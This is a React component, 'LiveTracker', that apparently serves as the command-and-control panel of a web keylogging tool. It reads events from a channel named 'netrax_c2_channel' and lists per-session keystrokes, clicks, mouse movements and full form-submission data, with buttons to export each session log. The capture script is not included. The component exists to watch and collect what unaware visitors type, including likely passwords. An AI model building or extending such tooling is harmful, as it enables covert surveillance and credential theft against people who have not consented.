
'use client';

import { useState, useEffect } from 'react';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { ScrollArea } from '@/components/ui/scroll-area';
import { Workflow, FileDown, Trash2, Keyboard, MousePointer, CaseUpper, FileInput, Monitor } from 'lucide-react';
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"

export type TrackedEvent = {
  sessionId: string;
  type: 'connection' | 'keystroke' | 'click' | 'mousemove' | 'form-submit';
  data: any;
  timestamp: string;
  url: string;
  userAgent: string;
};

const getEventIcon = (type: TrackedEvent['type']) => {
    switch (type) {
        case 'keystroke': return <Keyboard className="h-4 w-4" />;
        case 'click': return <MousePointer className="h-4 w-4" />;
        case 'form-submit': return <FileInput className="h-4 w-4 text-destructive" />;
        case 'connection': return <Monitor className="h-4 w-4" />;
        default: return <CaseUpper className="h-4 w-4" />;
    }
};

const formatEventData = (event: TrackedEvent) => {
    switch (event.type) {
        case 'connection':
            return `Session started on ${event.url}`;
        case 'keystroke':
            return `Key '${event.data.key}' pressed in target <${event.data.target}>`;
        case 'click':
            return `Clicked on element <${event.data.target}> at (${event.data.x}, ${event.data.y})`;
        case 'form-submit':
            return `Form submitted with data: ${JSON.stringify(event.data.data)}`;
        case 'mousemove':
            return `Mouse moved to (${event.data.x}, ${event.data.y})`;
        default:
            return JSON.stringify(event.data);
    }
};

export function LiveTracker() {
  const [sessions, setSessions] = useState<Map<string, TrackedEvent[]>>(new Map());
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);

  useEffect(() => {
    const channel = new BroadcastChannel('netrax_c2_channel');

    const handleMessage = (event: MessageEvent<TrackedEvent>) => {
      const newEvent = event.data;
      setSessions(prevSessions => {
        const newSessions = new Map(prevSessions);
        const sessionEvents = newSessions.get(newEvent.sessionId) || [];
        newSessions.set(newEvent.sessionId, [...sessionEvents, newEvent]);
        // Auto-select the first session that appears
        if (!selectedSessionId) {
            setSelectedSessionId(newEvent.sessionId);
        }
        return newSessions;
      });
    };

    channel.addEventListener('message', handleMessage);

    return () => {
      channel.removeEventListener('message', handleMessage);
      channel.close();
    };
  }, [selectedSessionId]); // Add selectedSessionId as a dependency

  const selectedSessionEvents = selectedSessionId ? sessions.get(selectedSessionId) || [] : [];
  
  const downloadFile = (content: string, fileName: string, contentType: string) => {
    const a = document.createElement("a");
    const file = new Blob([content], { type: contentType });
    a.href = URL.createObjectURL(file);
    a.download = fileName;
    a.click();
    URL.revokeObjectURL(a.href);
  };
  
  const handleExport = (format: 'json' | 'txt') => {
      if (!selectedSessionId || selectedSessionEvents.length === 0) return;
      const fileName = `session_${selectedSessionId}_log`;
      
      if (format === 'json') {
          const content = JSON.stringify(selectedSessionEvents, null, 2);
          downloadFile(content, `${fileName}.json`, 'application/json');
      } else {
          const content = selectedSessionEvents.map(e => `[${e.timestamp}] [${e.type.toUpperCase()}] ${formatEventData(e)}`).join('\\n');
          downloadFile(content, `${fileName}.txt`, 'text/plain');
      }
  };
  
  const handleClear = () => {
    setSessions(new Map());
    setSelectedSessionId(null);
  };

  return (
    <div className="grid md:grid-cols-3 gap-6 h-[calc(100vh-12rem)] min-h-[500px]">
      <Card className="md:col-span-1 flex flex-col">
        <CardHeader>
          <CardTitle>Active Sessions</CardTitle>
          <CardDescription>Select a session to view its activity log.</CardDescription>
        </CardHeader>
        <CardContent className="flex-grow overflow-y-auto">
          {sessions.size === 0 ? (
            <div className="text-center text-muted-foreground h-full flex items-center justify-center">
              Waiting for connections...
            </div>
          ) : (
            <div className="space-y-2">
              {Array.from(sessions.keys()).map(sessionId => (
                <Button 
                  key={sessionId} 
                  variant={selectedSessionId === sessionId ? 'secondary' : 'ghost'}
                  className="w-full justify-start font-mono text-xs h-auto py-2"
                  onClick={() => setSelectedSessionId(sessionId)}
                >
                  <div className="flex flex-col items-start text-left">
                     <span>{sessionId}</span>
                     <span className="text-muted-foreground font-sans truncate">
                       {sessions.get(sessionId)?.[0]?.url.split('//')[1].split('/')[0]}
                     </span>
                  </div>
                </Button>
              ))}
            </div>
          )}
        </CardContent>
         <CardFooter className="border-t pt-4">
            <Button onClick={handleClear} variant="destructive" className="w-full" disabled={sessions.size === 0}>
                <Trash2 className="mr-2 h-4 w-4"/> Clear All Sessions
            </Button>
        </CardFooter>
      </Card>
      <Card className="md:col-span-2 flex flex-col">
        <CardHeader>
          <div className="flex justify-between items-center">
            <div>
              <CardTitle className="flex items-center gap-2"><Workflow className="h-5 w-5"/> Activity Log</CardTitle>
              <CardDescription className="truncate">{selectedSessionId || 'No session selected'}</CardDescription>
            </div>
            <div className="flex gap-2">
                 <Button onClick={() => handleExport('json')} variant="outline" size="sm" disabled={!selectedSessionId}><FileDown className="mr-2 h-4 w-4"/>Export JSON</Button>
                 <Button onClick={() => handleExport('txt')} variant="outline" size="sm" disabled={!selectedSessionId}><FileDown className="mr-2 h-4 w-4"/>Export TXT</Button>
            </div>
          </div>
        </CardHeader>
        <CardContent className="flex-grow p-2 overflow-hidden">
          <ScrollArea className="h-full w-full bg-primary/10 rounded-md">
             <div className="p-4 font-mono text-xs">
              {selectedSessionEvents.length === 0 ? (
                <div className="flex h-full items-center justify-center text-muted-foreground font-sans min-h-60">
                    {selectedSessionId ? 'No activity recorded for this session yet.' : 'Select a session to begin.'}
                </div>
              ) : (
                selectedSessionEvents.map((event, index) => (
                  <div key={index} className="flex gap-4 items-start mb-2">
                    <div className="text-muted-foreground/60">{event.timestamp.split('T')[1].replace('Z','')}</div>
                    <div className="w-8 shrink-0 flex justify-center text-accent">
                       {getEventIcon(event.type)}
                    </div>
                    <div className="flex-1 text-muted-foreground break-all whitespace-pre-wrap font-sans">
                       {formatEventData(event)}
                    </div>
                  </div>
                ))
              )}
              </div>
          </ScrollArea>
        </CardContent>
      </Card>
    </div>
  );
}

